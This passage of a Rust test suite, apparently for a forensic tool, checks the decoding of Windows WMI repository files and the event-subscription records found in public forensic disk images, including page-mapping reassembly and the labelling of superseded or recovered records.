    );
    assert_eq!(consumer_action(&rec).image.as_deref(), Some("C:\\s.vbs"));
}

#[test]
fn a_consumer_of_a_class_this_build_does_not_describe_says_so() {
    use crate::wmi::consumer_action;
    let rec = synthetic_record("MSFT_UCScenarioControl", &[]);
    let action = consumer_action(&rec);
    assert!(!action.described);
    assert!(action.statement.contains("does not describe"));
}

// --- through the page mapping (HUNT-195) ---------------------------------------
//
// These fixtures are real pages put back at their own physical page numbers
// (the page list in MANIFEST.json), with every other page left zero, and the
// real MAPPING1.MAP of the same Lone Wolf repository. The expected values were
// read off the whole files by the independent Python decoder described in
// tests/fixtures/wmi/README.md.

const LONEWOLF_SPARSE: &[u8] =
    include_bytes!("../tests/fixtures/wmi/lonewolf-win10-objects-sparse.bin");
const LONEWOLF_MAPPING1: &[u8] =
    include_bytes!("../tests/fixtures/wmi/lonewolf-win10-MAPPING1.MAP");
const LONEWOLF_PAGES: usize = 2928;

/// Put each fixture page back at its physical page number.
fn at_physical_pages(fixture: &[u8], name: &str) -> Vec<u8> {
    let manifest: Value =
        serde_json::from_str(include_str!("../tests/fixtures/wmi/MANIFEST.json")).unwrap();
    let pages: Vec<usize> = manifest[name]["pages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|p| p.as_u64().unwrap() as usize)
        .collect();
    assert_eq!(fixture.len(), pages.len() * PAGE_SIZE);
    let mut buf = vec![0u8; LONEWOLF_PAGES * PAGE_SIZE];
    for (k, p) in pages.iter().enumerate() {
        buf[p * PAGE_SIZE..(p + 1) * PAGE_SIZE]
            .copy_from_slice(&fixture[k * PAGE_SIZE..(k + 1) * PAGE_SIZE]);
    }
    buf
}

fn lonewolf_mapping() -> crate::wmi_mapping::PageMap {
    crate::wmi_mapping::parse_mapping(LONEWOLF_MAPPING1, crate::wmi_mapping::MappingForm::Vista)
        .expect("the real mapping parses")
        .objects
}

/// `Win32_ComputerSystem`'s only definition in the Lone Wolf repository opens
/// at physical page 42 (logical 44), declares 14,086 bytes and so runs on into
/// logical page 45 -- physical page 45. Read without the mapping it is skipped
/// as page-spanning; the physically next page, 43, is not its continuation.
#[test]
fn a_definition_spanning_pages_is_reassembled_through_the_mapping() {
    let buf = at_physical_pages(LONEWOLF_SPARSE, "lonewolf-win10-objects-sparse.bin");
    let unmapped = scan(&buf);
    assert!(
        !unmapped.layouts.contains_key("Win32_ComputerSystem"),
        "without the mapping the spanning definition has no layout"
    );

    let map = lonewolf_mapping();
    let out = scan_with_mapping(&buf, Some(&map));
    let layouts = out
        .layouts
        .get("Win32_ComputerSystem")
        .expect("reassembled through logical page 45");
    assert_eq!(layouts.len(), 1);
    let l = &layouts[0];
    assert_eq!(l.offset, 42 * PAGE_SIZE + 32);
    assert_eq!(l.superclass, "CIM_UnitaryComputerSystem");
    assert_eq!(l.own.len(), 48);
    for name in [
        "AdminPasswordStatus",
        "AutomaticManagedPagefile",
        "AutomaticResetBootOption",
        "BootOptionOnWatchDog",
    ] {
        assert!(l.own.iter().any(|p| p.name == name), "{name}");
    }
    let s = &out.summary;
    assert!(s.mapping_used);
    assert_eq!(s.logical_pages, 2774);
    assert_eq!(s.pages_mapped, 2774);
    assert_eq!(s.pages_unmapped, 154);
    assert!(s.descriptors_reassembled >= 1);
    assert!(!unmapped.summary.mapping_used);
    assert_eq!(unmapped.summary.descriptors_reassembled, 0);
}

/// Physical page 2713 is one of the 154 pages MAPPING1.MAP maps to no logical
/// page; it holds one descriptor-listed record. The real pages hold no
/// subscription record in an unmapped page, so the labelling of one is pinned
/// by an edited mapping below -- a mechanism test, not validation.
#[test]
fn a_record_in_an_unmapped_page_is_marked_superseded() {
    let sparse = at_physical_pages(LONEWOLF_SPARSE, "lonewolf-win10-objects-sparse.bin");
    let map = lonewolf_mapping();
    let out = scan_with_mapping(&sparse, Some(&map));
    assert_eq!(
        out.summary.descriptors_in_unmapped_pages, 1,
        "page 2713's one record"
    );

    // The SCM triad on physical page 143, read through the real mapping:
    // current, mapped data.
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let logical_143 = map.inverse(LONEWOLF_PAGES)[143].expect("page 143 is mapped");
    let out = scan_with_mapping(&buf, Some(&map));
    let decoded: Vec<&WmiRecord> = out
        .records
        .iter()
        .filter(|r| matches!(r.decode, DecodeStatus::Decoded { .. }))
        .collect();
    assert_eq!(decoded.len(), 3);
    for r in &decoded {
        assert_eq!(
            r.page_state,
            PageState::Mapped {
                logical: logical_143
            }
        );
    }
    assert_eq!(out.summary.records_in_unmapped_pages, 0);

    // The same bytes with page 143 dropped from the mapping (an edit made
    // here, not a real repository): each record is a superseded copy.
    let mut edited = map.clone();
    edited.logical[logical_143] = crate::wmi_mapping::UNMAPPED;
    let out = scan_with_mapping(&buf, Some(&edited));
    let on_143: Vec<&WmiRecord> = out.records.iter().filter(|r| r.page == 143).collect();
    assert_eq!(on_143.len(), 3);
    for r in &on_143 {
        assert_eq!(r.page_state, PageState::Unmapped);
        assert!(
            r.notes.iter().any(|n| n.contains("superseded")),
            "{:?}",
            r.notes
        );
    }
    assert_eq!(out.summary.records_in_unmapped_pages, 3);
}

/// Without a mapping nothing changes: every record says the mapping was not read.
#[test]
fn without_a_mapping_every_record_says_the_mapping_was_not_read() {
    let out = scan(LONEWOLF);
    assert!(!out.records.is_empty());
    assert!(out
        .records
        .iter()
        .all(|r| r.page_state == PageState::MappingNotRead));
    assert!(!out.summary.mapping_used);
}

// --- the whole real files, when present ---------------------------------------

fn corpus_file(var: &str) -> Option<Vec<u8>> {
    let path = std::env::var(var).ok()?;
    Some(std::fs::read(&path).unwrap_or_else(|e| panic!("{var}={path}: {e}")))
}

/// The complete Lone Wolf OBJECTS.DATA (23,986,176 bytes), named by
/// `SEANCE_LONEWOLF_OBJECTS_DATA`. The numbers come from an independent
/// Python count over the same descriptor rule: 2928 pages, 11548 descriptor
/// records (427 of them declaring a size past their page), one triad.
#[test]
fn the_whole_lonewolf_repository_holds_one_triad_and_nothing_else() {
    let Some(buf) = corpus_file("SEANCE_LONEWOLF_OBJECTS_DATA") else {
        eprintln!("SEANCE_LONEWOLF_OBJECTS_DATA unset; the whole-file check did not run");
        return;
    };
    let out = scan(&buf);
    assert_eq!(out.summary.pages, 2928);
    assert_eq!(out.summary.descriptor_records, 11548);
    assert_eq!(out.summary.descriptors_spanning_pages, 427);
    assert_eq!(out.summary.descriptors_tried_as_class_definitions, 11121);
    assert_eq!(out.summary.instance_records_matched, 3);
    assert_eq!(out.summary.records_decoded, 3);
    assert_eq!(out.summary.hits_inside_other_records, 2);
    assert_eq!(out.summary.unreferenced_hits, 0);
    let offsets: Vec<usize> = out.records.iter().map(|r| r.offset).collect();
    assert_eq!(offsets, vec![0x11ef7a, 0x11f0b5, 0x11f1e0]);
}

/// The complete CFReDS XP OBJECTS.DATA (5,464,064 bytes), named by
/// `SEANCE_CFREDS_OBJECTS_DATA`: 667 pages, 3902 descriptor records (91 of
/// them declaring a size past their page), two filters, two bindings, one NTEventLogEventConsumer, four hash strings
/// inside other records -- and, on page 359, the MSFT_UCScenarioControl
/// instance the second binding names, which only the binding-driven class
/// scan can find (its MD5 signature occurs once, at 0x2cff40).
#[test]
fn the_whole_xp_repository_holds_two_subscriptions_and_resolves_the_updating_consumer() {
    let Some(buf) = corpus_file("SEANCE_CFREDS_OBJECTS_DATA") else {
        eprintln!("SEANCE_CFREDS_OBJECTS_DATA unset; the whole-file check did not run");
        return;
    };
    let out = scan(&buf);
    assert_eq!(out.summary.pages, 667);
    assert_eq!(out.summary.descriptor_records, 3902);
    assert_eq!(out.summary.descriptors_spanning_pages, 91);
    assert_eq!(out.summary.descriptors_tried_as_class_definitions, 3811);
    assert_eq!(out.summary.instance_records_matched, 6);
    assert_eq!(out.summary.records_decoded, 6);
    assert_eq!(out.summary.hits_inside_other_records, 4);
    assert_eq!(out.summary.unreferenced_hits, 0);
    let offsets: Vec<usize> = out.records.iter().map(|r| r.offset).collect();
    assert_eq!(
        offsets,
        vec![0x74b72, 0x74c59, 0x74d30, 0x29045d, 0x290572, 0x2cff40]
    );
    let uc = by_class(&out.records, "MSFT_UCScenarioControl");
    assert_eq!(uc.len(), 1);
    assert_eq!(
        text(uc[0], "Name"),
        "Microsoft WMI Updating Consumer Scenario Control"
    );
    let entries = crate::wmi_entries::entries_from_scan(&out, "/x/OBJECTS.DATA");
    let binding = entries
        .iter()
        .find(|e| {
            e.entry_name
                .ends_with("-> Microsoft WMI Updating Consumer Scenario Control")
        })
        .expect("the updating-consumer binding");
    assert_eq!(
        binding
            .extra
            .get("binding_consumer_resolved")
            .and_then(Value::as_bool),
        Some(true)
    );
    assert!(binding.incomplete_reason.is_none());
}

/// The complete Data Leakage OBJECTS.DATA (Windows 7; 14,794,752 bytes, inode
/// 58925 of the NIST CFReDS Data Leakage PC image; SHA-256
/// `60f36aa92bc04511ade1c4a052622b532285c046cd7b72857bf3f201fd584c29`),
/// named by `SEANCE_DATALEAKAGE_OBJECTS_DATA` — `WMI-1` in
/// `documentation/VALIDATION.md`, and the first real `CommandLineEventConsumer`
/// this decoder has met: Windows 7's stock `BVTConsumer`.
///
/// Read independently of this crate: a Python search for each class's
/// SHA-256 name hash (UTF-16LE of the upper-cased name, as upper-case hex
/// UTF-16LE) finds exactly ten hits — `NTEventLogEventConsumer` at 282506,
/// `__EventFilter` at 282821 and 14447162, `CommandLineEventConsumer` at
/// 14447560, and six `__FilterToConsumerBinding` — and a hex dump of the
/// consumer shows the header FILETIMEs `0x01CB8926E37533A5` and
/// `0x01CA042B90828ED4`, the CreatorSID bytes of
/// `S-1-5-21-3111613574-2524581245-2586426736-500`, and the strings
/// `CommandLineEventConsumer`, `cscript KernCap.vbs`, `BVTConsumer` and
/// `C:\\tools\\kernrate` (the doubled backslashes are in the bytes), ending at
/// 14447934 where the next binding's hash begins. The page and descriptor
/// counts are this build's and are pinned as a regression, not as an
/// independent reading.
#[test]
fn the_whole_data_leakage_repository_holds_the_windows_7_bvt_subscription() {
    let Some(path) = seance_core::test_support::corpus::path("SEANCE_DATALEAKAGE_OBJECTS_DATA")
    else {
        return;
    };
    let buf = std::fs::read(&path).expect("read the corpus file");
    let out = scan(&buf);
    assert_eq!(out.summary.pages, 1806);
    assert_eq!(out.summary.signature_hits, 10);
    assert_eq!(out.summary.descriptor_records, 7488);
    assert_eq!(out.summary.descriptors_spanning_pages, 201);
    assert_eq!(out.summary.instance_records_matched, 6);
    assert_eq!(out.summary.records_decoded, 6);
    assert_eq!(out.summary.hits_inside_other_records, 4);
    assert_eq!(out.summary.unreferenced_hits, 0);
    let offsets: Vec<usize> = out.records.iter().map(|r| r.offset).collect();
    assert_eq!(
        offsets,
        vec![282506, 282821, 283120, 14447162, 14447560, 14447934]
    );

    let c = by_class(&out.records, "CommandLineEventConsumer");
    assert_eq!(c.len(), 1);
    let c = c[0];
    assert_eq!(c.offset, 14447560);
    assert_eq!(c.size, 374, "ends where the next record's hash begins");
    assert_eq!(c.provenance, RecordProvenance::AllocatedPageRecord);
    assert_eq!(c.hash_form, HashForm::Sha256);
    assert_eq!(c.filetime_a, 0x01CB_8926_E375_33A5);
    assert_eq!(c.filetime_b, 0x01CA_042B_9082_8ED4);
    assert_eq!(text(c, "Name"), "BVTConsumer");
    assert_eq!(text(c, "CommandLineTemplate"), "cscript KernCap.vbs");
    assert_eq!(text(c, "WorkingDirectory"), "C:\\\\tools\\\\kernrate");
    assert_eq!(state(c, "ExecutablePath"), PropState::Null);
    assert_eq!(state(c, "RunInteractively"), PropState::Stored);
    assert_eq!(*prop(c, "RunInteractively"), PropValue::Bool(false));
    assert_eq!(
        c.creator_sid.as_deref(),
        Some("S-1-5-21-3111613574-2524581245-2586426736-500")
    );
    assert!(
        c.notes.is_empty(),
        "a real instance now stands behind this class: {:?}",
        c.notes
    );

    let f = by_class(&out.records, "__EventFilter");
    let bvt = f.iter().find(|r| text(r, "Name") == "BVTFilter").unwrap();
    assert_eq!(
        text(bvt, "Query"),
        "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \
         \"Win32_Processor\" AND TargetInstance.LoadPercentage > 99"
    );

    // Through the module, as the NTFS pipeline hands the file over.
    let art = objects_data_artifact(&buf, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let rows = entries(&produced, "AsepEntry");
    let consumer = rows
        .iter()
        .find(|r| r.metadata["entry_name"] == "BVTConsumer")
        .expect("the consumer row");
    let m = &consumer.metadata;
    assert_eq!(m["image_path"], "cscript");
    assert_eq!(m["arguments"], "KernCap.vbs");
    assert_eq!(m["command"], "cscript KernCap.vbs");
    assert_eq!(m["command_split_basis"], "bare_program_name_first_token");
    // HUNT-241: the bare `cscript` is not looked up at the volume root; with no
    // file index its lookup is the first search-path candidate, by convention.
    assert_ne!(m["target_lookup_path"], "/cscript");
    assert_eq!(
        m["target_search_path_resolution"],
        "search_path_convention_not_observed"
    );
    assert_eq!(m["working_dir"], "C:\\\\tools\\\\kernrate");
    assert_eq!(m["installed_time"], Value::Null);
    assert_eq!(m["record_time"], "2010-11-21T02:50:42.806262900+00:00");
    assert_eq!(
        m["record_filetime_b"],
        "2009-07-14T02:34:08.806062800+00:00"
    );
    assert_eq!(m["repository_liveness"], "not_established");
    assert!(m
        .get("decode_notes")
        .is_none_or(|n| n.as_array().is_some_and(Vec::is_empty)));
    let binding = rows
        .iter()
        .find(|r| r.metadata["entry_name"] == "BVTFilter -> BVTConsumer")
        .expect("the binding row");
    assert_eq!(binding.metadata["binding_consumer_resolved"], true);
    assert_eq!(binding.metadata["image_path"], "cscript");
}

/// `HUNT-244`, on the real `BVTConsumer`: `cscript KernCap.vbs` with
/// `WorkingDirectory` `C:\\tools\\kernrate`. The consumer's working directory
/// is tried before the system directories, and the rule applied is
/// `CreateProcess`'s (only `.exe` is appended — the consumer's properties are
/// `CreateProcess` parameters), not the shell's `PATHEXT` list.
///
/// The files fed to the index are the executables the NIST Data Leakage PC
/// image holds under those names, read independently with The Sleuth Kit's
/// `fls -r -p` (`dl_pc_fls.txt.gz`): `Windows/System32/cscript.exe` (inode
/// 24052) and `Windows/SysWOW64/cscript.exe` (36826). No `tools` directory
/// exists on that volume, so the working-directory candidate is tried and not
/// observed, and System32 answers.
#[test]
fn the_bvt_consumer_is_resolved_in_its_working_directory_first_under_the_create_process_rule() {
    let Some(path) = seance_core::test_support::corpus::path("SEANCE_DATALEAKAGE_OBJECTS_DATA")
    else {
        return;
    };
    let buf = std::fs::read(&path).expect("read the corpus file");
    let module = AsepEnumerator::new();
    for p in [
        "/Windows/System32/cscript.exe",
        "/Windows/SysWOW64/cscript.exe",
    ] {
        let file = Artifact::new(
            Uuid::new_v4(),
            ArtifactType::FileEntry,
            None,
            json!({"name": "cscript.exe", "path": p}),
        );
        module.process(&file).expect("note the file");
    }
    let art = objects_data_artifact(&buf, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = module.process(&art).expect("process");
    let rows = entries(&produced, "AsepEntry");
    let consumer = rows
        .iter()
        .find(|r| r.metadata["entry_name"] == "BVTConsumer")
        .expect("the consumer row");
    let m = &consumer.metadata;
    assert_eq!(
        m["target_search_path_candidates"],
        json!([
            "/tools/kernrate/cscript.exe",
            "/windows/system32/cscript.exe",
            "/windows/syswow64/cscript.exe",
            "/windows/cscript.exe",
        ]),
        "the consumer's WorkingDirectory is tried first, and CreateProcess appends only .exe"
    );
    assert_eq!(m["target_search_rule"], "create_process_exe_only");
    assert_eq!(m["target_exists"], "observed_at_path");
    assert_eq!(m["target_lookup_path"], "/windows/system32/cscript.exe");
    assert_eq!(m["target_search_path_directory"], "\\Windows\\System32");
    let basis = m["target_exists_basis"].as_str().unwrap();
    assert!(basis.contains("C:\\tools\\kernrate"), "{basis}");
    assert!(basis.contains("CreateProcess"), "{basis}");
}

// --- the whole real files through their mapping (HUNT-195) --------------------
//
// Each whole OBJECTS.DATA is read through the real mapping file of the same
// repository, committed under tests/fixtures/wmi/. Every count asserted was
// produced first by the independent Python decoder in
// tests/fixtures/wmi/README.md, which walks the logical pages in order, treats
// the pages a spanning record runs into as its continuation, and parses every
// record as a class definition (`VALIDATION.md` `WMI-2`).

fn mapped_whole_file(
    var: &str,
    mapping: &[u8],
    form: crate::wmi_mapping::MappingForm,
) -> Option<crate::wmi::ScanOutcome> {
    let path = seance_core::test_support::corpus::path(var)?;
    let buf = std::fs::read(&path).expect("read the corpus file");
    let map = crate::wmi_mapping::parse_mapping(mapping, form).expect("the real mapping parses");
    Some(scan_with_mapping(&buf, Some(&map.objects)))
}

/// Lone Wolf, Windows 10, through MAPPING1.MAP (sequence 25064). Without the
/// mapping 427 descriptors were skipped as page-spanning -- 63 of them read
/// from the first bytes of pages that are in fact another record's
/// continuation. Through it: 364 spanning records, all 364 reassembled, 282
/// of them class definitions.
#[test]
fn the_whole_lonewolf_repository_with_its_mapping_reassembles_the_spanning_descriptors() {
    let Some(out) = mapped_whole_file(
        "SEANCE_LONEWOLF_OBJECTS_DATA",
        LONEWOLF_MAPPING1,
        crate::wmi_mapping::MappingForm::Vista,
    ) else {
        return;
    };
    let s = &out.summary;
    assert_eq!(s.pages, 2928);
    assert_eq!(s.logical_pages, 2774);
    assert_eq!(s.pages_mapped, 2774);
    assert_eq!(s.pages_continuation, 1450);
    assert_eq!(s.pages_unmapped, 154);
    assert_eq!(s.mapped_pages_beyond_file, 0);
    assert_eq!(s.descriptor_records, 11460);
    assert_eq!(s.descriptors_in_unmapped_pages, 1951);
    assert_eq!(s.descriptors_spanning_pages, 364);
    assert_eq!(s.descriptors_reassembled, 364);
    // Windows 7 onward store a zero CRC-32: nothing to check, counted in neither.
    assert_eq!(s.reassembled_checksums_verified, 0);
    assert_eq!(s.reassembled_checksums_mismatched, 0);
    assert_eq!(s.descriptors_spanning_unresolved, 0);
    assert_eq!(s.class_definitions_seen, 7049);
    assert_eq!(s.records_in_unmapped_pages, 0);
    // The triad is unchanged, and current.
    let offsets: Vec<usize> = out.records.iter().map(|r| r.offset).collect();
    assert_eq!(offsets, vec![0x11ef7a, 0x11f0b5, 0x11f1e0]);
    assert_eq!(s.records_decoded, 3);
    assert!(out
        .records
        .iter()
        .all(|r| matches!(r.page_state, PageState::Mapped { .. })));
}

/// Data Leakage, Windows 7, through MAPPING1.MAP (sequence 26717): 201
/// spanning without the mapping, 180 through it, all reassembled, 98 of them
/// class definitions; the BVT subscription is unchanged and current.
#[test]
fn the_whole_data_leakage_repository_with_its_mapping_reassembles_the_spanning_descriptors() {
    let Some(out) = mapped_whole_file(
        "SEANCE_DATALEAKAGE_OBJECTS_DATA",
        include_bytes!("../tests/fixtures/wmi/dataleakage-win7-MAPPING1.MAP"),
        crate::wmi_mapping::MappingForm::Vista,
    ) else {
        return;
    };
    let s = &out.summary;
    assert_eq!(s.pages, 1806);
    assert_eq!(s.logical_pages, 1715);
    assert_eq!(s.pages_continuation, 884);
    assert_eq!(s.pages_unmapped, 91);
    assert_eq!(s.descriptor_records, 7449);
    assert_eq!(s.descriptors_in_unmapped_pages, 677);
    assert_eq!(s.descriptors_spanning_pages, 180);
    assert_eq!(s.descriptors_reassembled, 180);
    // Windows 7 onward store a zero CRC-32: nothing to check, counted in neither.
    assert_eq!(s.reassembled_checksums_verified, 0);
    assert_eq!(s.reassembled_checksums_mismatched, 0);
    assert_eq!(s.descriptors_spanning_unresolved, 0);
    assert_eq!(s.class_definitions_seen, 5110);
    assert_eq!(s.records_in_unmapped_pages, 0);
    assert_eq!(s.instance_records_matched, 6);
    assert_eq!(s.records_decoded, 6);
    assert!(out
        .records
        .iter()
        .any(|r| r.class_name == "CommandLineEventConsumer" && r.offset == 14447560));
}

/// CFReDS Hacking Case, Windows XP, through OBJECTS.MAP (sequence 4557). XP
/// descriptors carry a CRC-32 of the record, so reassembly is checked by the
/// repository itself: the independent decoder's 84 reassembled records all
/// match their stored CRC-32 (25 would, reading the physically next page).
#[test]
fn the_whole_xp_repository_with_its_mapping_reassembles_the_spanning_descriptors() {
    let Some(out) = mapped_whole_file(
        "SEANCE_CFREDS_OBJECTS_DATA",
        include_bytes!("../tests/fixtures/wmi/cfreds-xp-OBJECTS.MAP"),
        crate::wmi_mapping::MappingForm::Xp,
    ) else {
        return;
    };
    let s = &out.summary;
    assert_eq!(s.pages, 667);
    assert_eq!(s.logical_pages, 621);
    assert_eq!(s.pages_continuation, 156);
    assert_eq!(s.pages_unmapped, 46);
    assert_eq!(s.descriptor_records, 3894);
    assert_eq!(s.descriptors_in_unmapped_pages, 237);
    assert_eq!(s.descriptors_spanning_pages, 84);
    assert_eq!(s.descriptors_reassembled, 84);
    // The repository's own check, made by this scan: every one of the 84
    // reassembled records matches the CRC-32 its descriptor stores.
    assert_eq!(s.reassembled_checksums_verified, 84);
    assert_eq!(s.reassembled_checksums_mismatched, 0);
    assert_eq!(s.descriptors_spanning_unresolved, 0);
    assert_eq!(s.class_definitions_seen, 2865);
    assert_eq!(s.records_in_unmapped_pages, 0);
    assert_eq!(s.records_decoded, 6);
}

// --- the module reads the mapping beside OBJECTS.DATA (HUNT-195) --------------

/// OBJECTS.DATA with its neighbours attached by name, as the filesystem walker
/// attaches them inside an image (`attach_sibling_bundles`) or as a loose file
/// resolves them on disk.
fn repository_artifact(objects: Vec<u8>, neighbours: &[(&str, &[u8])]) -> Artifact {
    use seance_core::data_source::SiblingBundleSource;
    let relatives = neighbours
        .iter()
        .map(|(n, b)| (n.to_string(), source(b.to_vec()).unwrap()))
        .collect();
    let ds = SiblingBundleSource::new(source(objects).unwrap(), Default::default())
        .with_relatives(relatives);
    Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        Some(Arc::new(ds) as Arc<dyn DataSource>),
        json!({"name": "OBJECTS.DATA", "path": "/Windows/System32/wbem/Repository/OBJECTS.DATA"}),
    )
}

fn wmi_scan_of(produced: &[Artifact]) -> Value {
    let cov = entries(produced, "AsepCoverage");
    assert_eq!(cov.len(), 1);
    cov[0].metadata.get("wmi_scan").cloned().expect("wmi_scan")
}

/// The Lone Wolf triad's pages at their physical positions, with the real
/// MAPPING1.MAP beside them and a MAPPING2.MAP whose footer was flipped here
/// (a mechanism check of the refusal, not a real damaged file).
#[test]
fn a_repository_with_its_mapping_reports_the_mapping_it_used() {
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let mut damaged = LONEWOLF_MAPPING1.to_vec();
    damaged[67220] ^= 0xFF; // the objects section's footer
    let art = repository_artifact(
        buf,
        &[
            ("MAPPING1.MAP", LONEWOLF_MAPPING1),
            ("MAPPING2.MAP", &damaged),
        ],
    );
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["mapping_read"], json!(true), "{scan}");
    assert_eq!(scan["mapping_file"], json!("MAPPING1.MAP"));
    assert_eq!(scan["mapping_sequence"], json!(25064));
    assert_eq!(scan["index_walked"], json!(false));
    assert_eq!(scan["pages_unmapped"], json!(154));
    // Windows 10 stores a zero CRC-32, so the reassembly check has nothing to count.
    assert_eq!(scan["reassembled_checksums_verified"], json!(0));
    assert_eq!(scan["reassembled_checksums_mismatched"], json!(0));
    let refused = scan["mappings_refused"]
        .as_array()
        .expect("refusals listed");
    assert_eq!(refused.len(), 1);
    assert_eq!(refused[0]["file"], json!("MAPPING2.MAP"));
    assert!(refused[0]["reason"].as_str().unwrap().contains("footer"));
    assert!(scan["mappings_not_found"]
        .as_array()
        .unwrap()
        .contains(&json!("MAPPING3.MAP")));

    let rows = entries(&produced, "AsepEntry");
    assert_eq!(rows.len(), 3);
    for row in &rows {
        let basis = row.metadata["scan_basis"].as_str().unwrap();
        assert!(
            basis.contains("MAPPING1.MAP") && basis.contains("25064"),
            "{basis}"
        );
        assert!(basis.contains("INDEX.BTR"), "{basis}");
        assert!(!basis.contains("MAPPING*.MAP) were not read"), "{basis}");
        assert_eq!(row.metadata["record_page_state"], json!("mapped"));
        assert!(row.metadata["record_logical_page"].as_u64().is_some());
        assert_eq!(row.metadata["evidence_state"], json!("allocated_record"));
    }
    let cov = entries(&produced, "AsepCoverage");
    let rows = cov[0].metadata["categories"].as_array().unwrap();
    let wmi = rows
        .iter()
        .find(|r| r["category"] == json!("wmi_event_subscription"))
        .unwrap();
    let reason = wmi["status_reason"].as_str().unwrap();
    assert!(reason.contains("MAPPING1.MAP"), "{reason}");
}

#[test]
fn a_repository_without_its_mapping_keeps_the_unmapped_statement() {
    let art = objects_data_artifact(LONEWOLF, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["mapping_read"], json!(false));
    for row in entries(&produced, "AsepEntry") {
        assert_eq!(
            row.metadata["scan_basis"].as_str(),
            Some(crate::wmi_entries::SCAN_BASIS)
        );
        assert_eq!(row.metadata["record_page_state"], json!("mapping_not_read"));
    }
    // A mapping that does not fit the file (the compacted fixture is nine
    // pages; the mapping accounts for 2928) is not used, and says why.
    let art = repository_artifact(LONEWOLF.to_vec(), &[("MAPPING1.MAP", LONEWOLF_MAPPING1)]);
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let scan = wmi_scan_of(&produced);
    assert_eq!(scan["mapping_read"], json!(false));
    let reason = scan["mappings_refused"][0]["reason"].as_str().unwrap();
    assert!(reason.contains("2928") && reason.contains("9"), "{reason}");
}

/// The triad's page dropped from the mapping (an edit made here): each record
/// is published as a superseded copy, under the recovered record type.
#[test]
fn a_record_in_a_page_the_mapping_drops_is_published_as_superseded() {
    let map = lonewolf_mapping();
    let logical_143 = map.inverse(LONEWOLF_PAGES)[143].unwrap();
    let mut edited = LONEWOLF_MAPPING1.to_vec();
    let at = 24 + 24 * logical_143;
    edited[at..at + 4].copy_from_slice(&u32::MAX.to_le_bytes());
    let buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let art = repository_artifact(buf, &[("MAPPING1.MAP", &edited)]);
    let produced = AsepEnumerator::new().process(&art).expect("process");
    assert!(entries(&produced, "AsepEntry").is_empty());
    let rows = entries(&produced, "RecoveredAsepEntry");
    assert_eq!(rows.len(), 3);
    for row in rows {
        assert_eq!(row.metadata["evidence_state"], json!("superseded"));
        assert_eq!(row.metadata["record_page_state"], json!("unmapped"));
        assert!(row.metadata["scan_basis"]
            .as_str()
            .unwrap()
            .contains("superseded"));
    }
    assert_eq!(
        wmi_scan_of(&produced)["records_in_unmapped_pages"],
        json!(3)
    );
}

/// The real SCM filter record copied here into the slack of a mapped page
/// whose descriptor table lists nothing -- a mechanism test of residue inside
/// a current page, not validation. No descriptor table lists the record, so
/// nothing may say it is current or in force: its page being mapped says only
/// that the page is, not that the bytes are a record the repository holds.
#[test]
fn a_record_no_descriptor_lists_in_a_mapped_page_is_not_called_current() {
    let map = lonewolf_mapping();
    let inverse = map.inverse(LONEWOLF_PAGES);
    let fixture_pages = [0usize, 1, 112, 130, 140, 143, 148, 1316, 2645];
    let p = (2..LONEWOLF_PAGES)
        .find(|p| inverse[*p].is_some() && !fixture_pages.contains(p))
        .expect("a mapped page the fixture leaves empty");
    let mut buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let rec = lonewolf_filter_bytes();
    let at = p * PAGE_SIZE + 0x1000;
    buf[at..at + rec.len()].copy_from_slice(rec);
    let art = repository_artifact(buf, &[("MAPPING1.MAP", LONEWOLF_MAPPING1)]);
    let produced = AsepEnumerator::new().process(&art).expect("process");
    let rows = entries(&produced, "RecoveredAsepEntry");
    let row = rows
        .iter()
        .find(|r| r.metadata["record_offset"] == json!(at))
        .expect("the residue record is published as recovered");
    assert_eq!(row.metadata["evidence_state"], json!("recovered"));
    assert_eq!(row.metadata["record_page_state"], json!("mapped"));
    assert_eq!(
        row.metadata["repository_liveness"],
        json!("unreferenced_in_mapped_page")
    );
    let basis = row.metadata["scan_basis"].as_str().unwrap();
    assert!(!basis.contains("current page set"), "{basis}");
    assert!(!basis.contains("descriptor table listing it"), "{basis}");
    assert!(basis.contains("no descriptor table lists"), "{basis}");
    let enabled = row.metadata["enabled_basis"].as_str().unwrap();
    assert!(!enabled.contains("in force whenever"), "{enabled}");
    assert!(!enabled.contains("current page mapping"), "{enabled}");
    assert!(enabled.contains("not in force as found"), "{enabled}");
}

/// A record in the trailing part-page past the last whole page: the mapping
/// accounts for whole pages only, so no entry of it covers these bytes (a
/// mechanism test; the bytes are the real filter record placed here).
#[test]
fn a_record_in_the_trailing_part_page_is_not_placed_in_the_mapping() {
    let mut buf = at_physical_pages(LONEWOLF, "lonewolf-win10-objects-pages.bin");
    let at = buf.len() + 0x100;
    let mut tail = vec![0u8; PAGE_SIZE / 2];
    let rec = lonewolf_filter_bytes();
    tail[0x100..0x100 + rec.len()].copy_from_slice(rec);
    buf.extend_from_slice(&tail);
    let art = repository_artifact(buf, &[("MAPPING1.MAP", LONEWOLF_MAPPING1)]);
    let produced = AsepEnumerator::new().process(&art).expect("process");
    assert_eq!(wmi_scan_of(&produced)["mapping_read"], json!(true));
    let rows = entries(&produced, "RecoveredAsepEntry");
    let row = rows
        .iter()
        .find(|r| r.metadata["record_offset"] == json!(at))
        .expect("the trailing record is published as recovered");
    assert_eq!(row.metadata["record_page_state"], json!("beyond_mapping"));
    assert_eq!(row.metadata["repository_liveness"], json!("beyond_mapping"));
    let basis = row.metadata["scan_basis"].as_str().unwrap();
    assert!(!basis.contains("current page"), "{basis}");
    assert!(basis.contains("no entry of the mapping covers"), "{basis}");
    let enabled = row.metadata["enabled_basis"].as_str().unwrap();
    assert!(!enabled.contains("current page mapping"), "{enabled}");
